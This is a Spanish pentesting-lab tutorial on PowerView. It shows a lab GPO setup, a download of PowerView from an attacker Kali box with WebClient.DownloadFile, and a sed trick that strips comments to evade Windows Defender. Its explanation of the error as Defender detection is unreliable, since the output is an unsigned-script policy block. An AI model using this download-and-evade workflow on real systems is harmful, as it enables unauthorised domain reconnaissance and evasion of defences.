---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PowerView

En este caso vamos a ver una herramienta bastante famosa para `hacking` a parte de otras en entornos de `Windows`.

Lo primero que vamos hacer es configurar una `GPO` que aplique a los diferentes equipos dentro de nuestro `DC`.

Esto lo vamos hacer ya que en los diferentes equipos que estan dentro del dominio del `DC` no puede ejecutarse scripts de `PowerShell` por defecto como medida de seguirdad, pero en algunos casos los `Administradores` necesitan habilitar esta opcion para hacer algunos cambios en los diferentes equipos y esto se hace mediante una regla de `GPO` para que se aplique a los equipos que queramos a la vez y no tengamos que ir uno por uno.

Por lo que vamos a irnos en el `DC` al panel de `Servidor del Administrador` -> `Herramientas` -> `Administracion de directivas de grupo` -> aqui vamos a crear una `GPO` a nivel de dominio que solo afecte a nuestro dominio click derecho en `corp.local` -> `Crear un GPO en este dominio y vincularlo aqui...` -> se llamara `Script Execution Policy` -> `Aceptar` -> click derecho en el `Script Execution Policy` -> `Editar` -> como vamos a crear una `GPO` que va a estar a nivel de equipo nos iremos a `Configuracion del Equipo` -> `Directivas` -> `Plantillas administrativas` -> `Componentes de Windows` -> `Windows PoweShell` -> pulsamos doble click en `Activar la ejecuccion de scripts` -> marcamos `Habilitada` -> seleccionamos en `Directivas de ejecuccion` el `Permitir Scripts locales y scripts remotos firmados` -> `Aplicar` -> `Aceptar`.

Con esto ya estaria aplicado correctamente esta `politica`/`GPO`, ahora tendremos que reiniciar los equipos del dominio que en mi caso son 2 y se aplicaran las politicas correctamente.

### Instalación de PowerView

De mientras vamos instalar `PowerView` en nuestro `kali`.

Vamos a suponer que para la auditoria nos han proporcionado credenciales de un usuario del dominio para conectarnos de forma remota, pero sin privilegios de administrador.

En el siguiente link vamos a ver un `suit/conjunto` de herramientas para todas las fases de un `pentest` de un ejercicio de seguridad o de `hacking etico` para normalmente realizar recopilacion de informacion, explotacion, analisis de vulnerabilidades, etc... Sobre equipos de `Microsoft` todas las cosas que hace estan implementadas en `PowerShell` por lo que es muy util para nosotros.

URL = [GitHub PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

Vamos a irnos al modulo de `recon` (Reconocimiento) -> entraremos en `PowerView.ps1` en el script.

Una vez que estemos aqui dentro:

[Script PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

Lo copiaremos entero y haremos lo siguiente:

```shell
nano PowerView.ps1

#Dentro del nano

<PEGAR_SCRIPT_POWERVIEW>
```

Lo guardamos y ya lo tendriamos listo en nuestro `kali`.

Vamos a probar 2 formas de enumerar un sistema `Windows` tanto con `PowerView` de forma automatizada, como de forma manual sin `PwerView` ya que en algunos casos esto peude ser detectado por antivirus o herramientas de seguridad.

Imaginemos que nos propocionan la maquina `WS01` para realizar nuestras pruebas de pentesting, vamos a probar de primeras el `PowerView` en dicha maquina de la siguiente forma:

### Transferencia de archivo .ps1 a maquina windows

Antes tendremos que realizar una pequeña configuracion ya que al reiniciar o apagar el equipo se desactiva, tendremos que darle click derecho en el `adaptador de red` -> `Ethernet` -> `Configuracion de uso compartido avanzado` -> y activar las 2 opciones `Activar la deteccion de redes` y `Activar el uso compartido de archivos e impresoras` -> `Guardar cambios` pedira credenciales de administrador, las metemos y listo.

<figure><img src="../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Con esto ya nos podremos pasar el archivo `.ps1` a la maquina `Windows` todo esto lo podremos hacer ya que tenemos acceso a dicha maquina.

Haremos el mismo proceso pero para con el `WS02`, por lo que si hacemos en un `PwerShell` lo siguiente:

```powershell
ping WS02
```

Tiene que dar `ping` y vicebersa.

Ahora nos vamos a crear en nuestro `kali` un servidor de `python3` en la misma carpeta del archivo `PowerView.ps1` para pasarnos el archivo de forma facil y sencilla, ya profundizaremos en tecnicas de `PostExplotacion` para este tipo de cosas, pero en este caso lo haremos de forma sencilla.

```shell
python3 -m http.server 80
```

Y en la maquina `Windows` buscaremos la siguiente direccion `URL` en un navegador web:

```
URL = http://<IP>/PowerView.ps1
```

Si le damos a `ENTER` veremos que se nos descarga el archivo.

O tambien lo podremos hacer desde un `PowerShell` de la siguiente forma:

```powershell
cd .\Desktop
(New-Object System.NET.WebClient).DownloadFile("http://<IP>/PowerView.ps1", "PowerView.ps1")
```

Una vez que ya tengamos el archivo en nuestro escritorio de `WS01` haremos lo siguiente.

### Prueba de forma automatica PoweView.ps1

Ahora para lanzar este script lo hariamos de la siguiente forma en un `PwerShell` del equipo `WS01`:

```powershell
. .\PowerView.ps1
```

Info:

```
. : No se puede cargar el archivo C:\Users\empleado1\Desktop\PowerView.ps1. El archivo C:\Users\empleado1\Desktop\PowerView.ps1 no está firmado
digitalmente. No se puede ejecutar este script en el sistema actual. Para obtener más información acerca de la ejecución de scripts y la configuración de la
directiva de ejecución, consulta about_Execution_Policies en https:/go.microsoft.com/fwlink/?LinkID=135170.
En línea: 1 Carácter: 3
+ . .\PowerView.ps1
+   ~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

Nos da un error de que puede contener archivos maliciosos y no lo ejecuta, ya que `Windows Defender` tiene guardado el `hash` de dicho fichero ya que se utiliza mucho para auditorias o practicas de `hacking etico` por lo que lo bloquea.

### Bypass Windows Defender PowerView

Lo que tendremos que hacer sera eliminar todos los comentarios del script para que no tenga esa `"firma"` y que el `hash` con el que esta identificando el `Windows Defender` no sea el mismo, por lo que lo va a tomar como un archivo legitimo, nos iremos al `kali` y pondremos lo siguiente:

```shell
sed '/<#/,/#>/d' PowerView.ps1 > new_powerview.ps1
```

Ahora una vez que ya hayamos eliminado todos los comentarios con este comando, nos lo volveremos a pasar al `WS01` como hicimos anteriormente, una vez que ya lo tengamos en el equipo, ejecutaremos el mismo comando de antes de `PowerShell`:

```powershell
. .\new_powerview.ps1
```

Con esto no nos aparecera nada por lo que lo ejecutamos correctamente y ya podremos utilizar `PowerView` en este equipo.
